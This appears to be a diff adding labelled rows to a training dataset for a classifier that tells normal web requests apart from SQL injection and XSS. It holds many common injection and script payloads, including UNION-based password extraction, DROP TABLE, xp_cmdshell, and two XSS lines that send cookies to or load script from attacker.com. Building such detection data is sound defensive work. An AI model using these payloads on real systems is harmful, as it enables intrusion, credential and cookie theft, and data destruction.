+<img src=x onerror=alert('XSS')>,2,XSS
+admin'/*,1,SQL_INJECTION
+profile/edit?name=Johnathan,0,NORMAL
+browse?tag=john_doe,0,NORMAL
+alice.smith@example.com,0,NORMAL
+query=<isindex type=image src=1 onerror=alert(1)>,2,XSS
+best headphones under 100,0,NORMAL
+"item?id="" OR ""1""=""1",1,SQL_INJECTION
+login?user=admin' #,1,SQL_INJECTION
+search?q=mechanical+pencil+0.5mm,0,NORMAL
+filter?category=catalog?page=2&sort=price_asc&sort=desc,0,NORMAL
+"query=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+<select autofocus onfocus=alert(1)>,2,XSS
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+home,0,NORMAL
+login?user=' OR 'a'='a,1,SQL_INJECTION
+item/newsletter/subscribe?email=user@test.org?ref=homepage,0,NORMAL
+filter?category=index.html&sort=desc,0,NORMAL
+1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+"item?id=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+query=search?q=4k+oled+television+lg&page=1,0,NORMAL
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+' HAVING 1=1 --,1,SQL_INJECTION
+query=<script>alert('XSS')</script>,2,XSS
+query=view_order?order_id=983214&page=1,0,NORMAL
+terms-and-conditions,0,NORMAL
+search?q=assets/js/bundle.min.js,0,NORMAL
+search?q=order/status?tracking=FEDEX-889922,0,NORMAL
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+api/search?term=dashboard?view=summary,0,NORMAL
+images/banner-sale.jpg,0,NORMAL
+search?q=1' ORDER BY 2--+,1,SQL_INJECTION
+<details open ontoggle=alert(1)>,2,XSS
+<body onload=alert('XSS')>,2,XSS
+' OR '1'='1,1,SQL_INJECTION
+assets/css/main.css,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+python programming book,0,NORMAL
+comment='><script>alert('PWNED')</script>,2,XSS
+"filter="" OR ""1""=""1",1,SQL_INJECTION
+"' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+item?id=1' AND SLEEP(10)--,1,SQL_INJECTION
+"<video><source onerror=""javascript:alert(1)"">",2,XSS
+settings?theme=dark&lang=en,0,NORMAL
+api/search?term=products/audio/bluetooth-speakers,0,NORMAL
+password123!,0,NORMAL
+<script>alert('XSS')</script>,2,XSS
+order/status?tracking=FEDEX-889922,0,NORMAL
+query=profile/edit?name=Johnathan&page=1,0,NORMAL
+"filter="" OR ""1""=""1",1,SQL_INJECTION
+index.html,0,NORMAL
+laptop,0,NORMAL
+"redirect=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+query=settings?theme=dark&lang=en&page=1,0,NORMAL
+item/best+headphones+under+100?ref=homepage,0,NORMAL
+alice.smith@example.com,0,NORMAL
+<select autofocus onfocus=alert(1)>,2,XSS
+"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+<select autofocus onfocus=alert(1)>,2,XSS
+order/status?tracking=FEDEX-889922,0,NORMAL
+search?q=<input autofocus onfocus=alert(1)>,2,XSS
+profile/edit?name=Johnathan,0,NORMAL
+filter?category=contact&sort=desc,0,NORMAL
+api/search?term=wireless+mouse,0,NORMAL
+api/search?term=shoes+for+running,0,NORMAL
+item/john_doe?ref=homepage,0,NORMAL
+product?id=102&category=electronics,0,NORMAL
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+cart/checkout?step=billing,0,NORMAL
+filter?category=newsletter/subscribe?email=user@test.org&sort=desc,0,NORMAL
+admin'/*,1,SQL_INJECTION
+' OR '1'='1,1,SQL_INJECTION
+search?q=spring+sale+discount,0,NORMAL
+contact,0,NORMAL
+item?id=1' ORDER BY 3--+,1,SQL_INJECTION
+api/search?term=cart/checkout?step=billing,0,NORMAL
+filter=1' ORDER BY 2--+,1,SQL_INJECTION
+order/status?tracking=FEDEX-889922,0,NORMAL
+checkout?shipping=standard&promo=WELCOME10,0,NORMAL
+) or ('1'='1,1,SQL_INJECTION
+privacy-policy,0,NORMAL
+item?id=' or 1=1/*,1,SQL_INJECTION
+"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+products/audio/bluetooth-speakers,0,NORMAL
+"search?q=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+"login?user=1' UNION SELECT null, null, null--",1,SQL_INJECTION
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+item?id=admin'/*,1,SQL_INJECTION
+login?user=' or 1=1/*,1,SQL_INJECTION
+) or ('1'='1,1,SQL_INJECTION
+product?id=102&category=electronics,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+filter?category=account/security/2fa-setup&sort=desc,0,NORMAL
+api/search?term=privacy-policy,0,NORMAL
+"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+filter='; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+<input autofocus onfocus=alert(1)>,2,XSS
+<script>alert(1)</script>,2,XSS
+1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
+blog/post-10-cybersecurity-tips,0,NORMAL
+"search?q=<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+browse?tag=product?id=102&category=electronics,0,NORMAL
+query=alice.smith@example.com&page=1,0,NORMAL
+search?q=admin_user_2024,0,NORMAL
+login?user=' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+redirect=<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>,2,XSS
+api/search?term=laptop,0,NORMAL
+1' ORDER BY 1--+,1,SQL_INJECTION
+'><script>alert('PWNED')</script>,2,XSS
+"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+comment=<details open ontoggle=alert(1)>,2,XSS
+' HAVING 1=1 --,1,SQL_INJECTION
+"comment=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+query=search?q=spring+sale+discount&page=1,0,NORMAL
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,2,XSS
+"redirect=<video><source onerror=""javascript:alert(1)"">",2,XSS
+browse?tag=products/audio/bluetooth-speakers,0,NORMAL
+cotton t-shirt blue,0,NORMAL
+wireless mouse,0,NORMAL
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+query=settings?theme=dark&lang=en&page=1,0,NORMAL
+"search?q=' UNION SELECT username, password FROM users--",1,SQL_INJECTION
+wireless mouse,0,NORMAL
+1; DROP TABLE users--,1,SQL_INJECTION
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+query=catalog?page=2&sort=price_asc&page=1,0,NORMAL
+"query=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+api/search?term=alice.smith@example.com,0,NORMAL
+query=<img src=x onerror=alert('XSS')>,2,XSS
+api/search?term=dashboard?view=summary,0,NORMAL
+item/profile/edit?name=Johnathan?ref=homepage,0,NORMAL
+1; DROP TABLE users--,1,SQL_INJECTION
+search?q=gaming+monitor,0,NORMAL
+search?q=shoes+for+running,0,NORMAL
+browse?tag=terms-and-conditions,0,NORMAL
+"comment=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+browse?tag=order/status?tracking=FEDEX-889922,0,NORMAL
+query=gaming+monitor&page=1,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+browse?tag=contact,0,NORMAL
+account/security/2fa-setup,0,NORMAL
+<body onload=alert('XSS')>,2,XSS
+laptop,0,NORMAL
+browse?tag=gaming+monitor,0,NORMAL
+1' ORDER BY 3--+,1,SQL_INJECTION
+cart/checkout?step=billing,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+product?id=102&category=electronics,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+' or 1=1/*,1,SQL_INJECTION
+laptop,0,NORMAL
+search?q=<script>alert(1)</script>,2,XSS
+filter?category=product?id=102&category=electronics&sort=desc,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+order/status?tracking=FEDEX-889922,0,NORMAL
+item?id=admin' #,1,SQL_INJECTION
+search?q=1' ORDER BY 1--+,1,SQL_INJECTION
+"comment=<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+login?user=1' AND SLEEP(10)--,1,SQL_INJECTION
+"' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+login?user=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+filter=1' ORDER BY 3--+,1,SQL_INJECTION
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+admin' #,1,SQL_INJECTION
+browse?tag=profile/edit?name=Johnathan,0,NORMAL
+filter=1' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL_INJECTION
+search?q=search?q=4k+oled+television+lg,0,NORMAL
+item/apple+macbook+pro+m2?ref=homepage,0,NORMAL
+filter?category=usb+c+cable+2m&sort=desc,0,NORMAL
+wireless mouse,0,NORMAL
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--,1,SQL_INJECTION
+profile/edit?name=Johnathan,0,NORMAL
+login?user=' OR 'a'='a,1,SQL_INJECTION
+browse?tag=laptop,0,NORMAL
+query=search?q=mechanical+pencil+0.5mm&page=1,0,NORMAL
+view_order?order_id=983214,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+<marquee onstart=alert(1)>,2,XSS
+search?q=<script>alert(1)</script>,2,XSS
+query=assets/css/main.css&page=1,0,NORMAL
+item/john_doe?ref=homepage,0,NORMAL
+item/view_order?order_id=983214?ref=homepage,0,NORMAL
+query=password123!&page=1,0,NORMAL
+query=account/security/2fa-setup&page=1,0,NORMAL
+search?q=blog/post-10-cybersecurity-tips,0,NORMAL
+item/faq/shipping-times?ref=homepage,0,NORMAL
+search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>,2,XSS
+1; DROP TABLE users--,1,SQL_INJECTION
+filter=' or 1=1#,1,SQL_INJECTION
+login?user=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+browse?tag=api/v1/users?limit=10&offset=20,0,NORMAL
+search?q=spring+sale+discount,0,NORMAL
+search?q=<script>alert(1)</script>,2,XSS
+item/cotton+t-shirt+blue?ref=homepage,0,NORMAL
+<img src=x onerror=alert('XSS')>,2,XSS
+laptop,0,NORMAL
+item?id=1' ORDER BY 3--+,1,SQL_INJECTION
+browse?tag=download/specs-datasheet.pdf,0,NORMAL
+filter?category=privacy-policy&sort=desc,0,NORMAL
+query=download/specs-datasheet.pdf&page=1,0,NORMAL
+"query=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert(1)//'>",2,XSS
+api/search?term=assets/css/main.css,0,NORMAL
+index.html,0,NORMAL
+') or ('1'='1'--,1,SQL_INJECTION
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+item/laptop?ref=homepage,0,NORMAL
+filter=admin' --,1,SQL_INJECTION
+<details open ontoggle=alert(1)>,2,XSS
+search?q=<body onload=alert('XSS')>,2,XSS
+"search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",1,SQL_INJECTION
+"<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+admin_user_2024,0,NORMAL
+query=<img src=x onerror=alert('XSS')>,2,XSS
+browse?tag=catalog?page=2&sort=price_asc,0,NORMAL
+api/v1/users?limit=10&offset=20,0,NORMAL
+contact,0,NORMAL
+item/laptop?ref=homepage,0,NORMAL
+search?q=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E,2,XSS
+query=laptop&page=1,0,NORMAL
+search?q=about-us,0,NORMAL
+admin' --,1,SQL_INJECTION
+"redirect=<iframe src=""javascript:alert(`XSS`)""></iframe>",2,XSS
+filter?category=password123!&sort=desc,0,NORMAL
+item?id=admin'/*,1,SQL_INJECTION
+browse?tag=gaming+monitor,0,NORMAL
+item/order/status?tracking=FEDEX-889922?ref=homepage,0,NORMAL
+filter=SELECT * FROM members WHERE username = 'admin' OR '1'='1',1,SQL_INJECTION
+browse?tag=profile/edit?name=Johnathan,0,NORMAL
+query=<svg/onload=alert('XSS')>,2,XSS
+newsletter/subscribe?email=user@test.org,0,NORMAL
+filter?category=admin_user_2024&sort=desc,0,NORMAL
+query=terms-and-conditions&page=1,0,NORMAL
+browse?tag=newsletter/subscribe?email=user@test.org,0,NORMAL
+filter?category=settings?theme=dark&lang=en&sort=desc,0,NORMAL
+reviews?rating=5&verified=true,0,NORMAL
+search?q=mechanical+pencil+0.5mm,0,NORMAL
+item?id=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
+api/search?term=alice.smith@example.com,0,NORMAL
+"<object data=""javascript:alert(1)"">",2,XSS
+"<a href=""javascript:alert('XSS')"">Click here</a>",2,XSS
+account/security/2fa-setup,0,NORMAL
+item/john_doe?ref=homepage,0,NORMAL
+password123!,0,NORMAL
+browse?tag=cotton+t-shirt+blue,0,NORMAL
+'; WAITFOR DELAY '0:0:5'--,1,SQL_INJECTION
+"redirect=<object data=""javascript:alert(1)"">",2,XSS
+index.html,0,NORMAL
+search?q=' OR '1'='1,1,SQL_INJECTION
+login?user=admin' --,1,SQL_INJECTION
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,SQL_INJECTION
+search?q=' OR 1=1 --,1,SQL_INJECTION
+browse?tag=catalog?page=2&sort=price_asc,0,NORMAL
+' GROUP BY column_name HAVING 1=1 --,1,SQL_INJECTION
+item/products/audio/bluetooth-speakers?ref=homepage,0,NORMAL
+wireless mouse,0,NORMAL
+profile/edit?name=Johnathan,0,NORMAL
+redirect=<isindex type=image src=1 onerror=alert(1)>,2,XSS
+"query=<div onmouseover=""alert('Hover XSS')"">Hover over me</div>",2,XSS
+item/gaming+monitor?ref=homepage,0,NORMAL
+search?q=<body onload=alert('XSS')>,2,XSS
+<script>alert(1)</script>,2,XSS
+' OR 1=1 --,1,SQL_INJECTION
+"search?q=' UNION ALL SELECT 1, 2, 3, table_name FROM information_schema.tables--",1,SQL_INJECTION
+terms-and-conditions,0,NORMAL
+item/gaming+monitor?ref=homepage,0,NORMAL
+search?q=home,0,NORMAL
+item?id=%27%20OR%201%3D1%20--,1,SQL_INJECTION
+api/search?term=cotton+t-shirt+blue,0,NORMAL
+"comment=""><script>alert(document.domain)</script>",2,XSS
+<svg onload=alert(1)>,2,XSS
+<isindex type=image src=1 onerror=alert(1)>,2,XSS
+api/search?term=assets/js/bundle.min.js,0,NORMAL
+"<img src=""invalid"" onerror=""alert(document.cookie)"">",2,XSS
+search?q=settings?theme=dark&lang=en,0,NORMAL
+dashboard?view=summary,0,NORMAL
+filter?category=privacy-policy&sort=desc,0,NORMAL
+browse?tag=reviews?rating=5&verified=true,0,NORMAL
+"<script src=""http://attacker.com/malicious.js""></script>",2,XSS
+usb c cable 2m,0,NORMAL
+""" OR ""1""=""1",1,SQL_INJECTION
+login?user=1; EXEC xp_cmdshell('dir')--,1,SQL_INJECTION
